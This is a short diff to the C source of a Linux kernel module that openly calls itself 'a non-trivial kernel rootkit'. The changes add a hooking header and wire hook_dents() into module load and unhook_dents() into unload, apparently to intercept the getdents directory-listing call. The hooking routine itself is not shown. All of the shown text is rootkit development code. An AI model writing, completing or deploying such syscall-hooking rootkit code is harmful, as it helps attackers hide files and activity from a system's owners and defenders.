@@ -5,7 +5,7 @@
 #include <linux/slab.h>
 #include <linux/fs.h>
 #include <linux/string.h>
-
+#include <hooking.h>
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Seb and Gibble");
 MODULE_DESCRIPTION("A non-trivial kernel rootkit");
@@ -28,7 +28,6 @@ static struct device *devStruct = NULL;
 int module_is_hidden  = 0;
 
 /* syscall variables */
-unsigned long *syscall_table;
 //sys_getdents_t getDents_original = NULL;
 
 static struct file_operations fops = {
@@ -59,11 +58,16 @@ static int __init nontrivial_init(void){
 		printk(KERN_ALERT "Failed to create device\n");
 		return -1; //fix this
 	}
+	if (hook_dents() == -1){
+		printk(KERN_INFO "hook failed :(");
+		return -1;
+	}
 	// get syscall table
 	printk(KERN_INFO "Successfully registeded module\n");
 	return 0;
 }
 static void __exit nontrivial_exit(void){
+	unhook_dents();
 	device_destroy(devClass, MKDEV(majorNum,0));
 	class_unregister(devClass);
 	class_destroy(devClass);
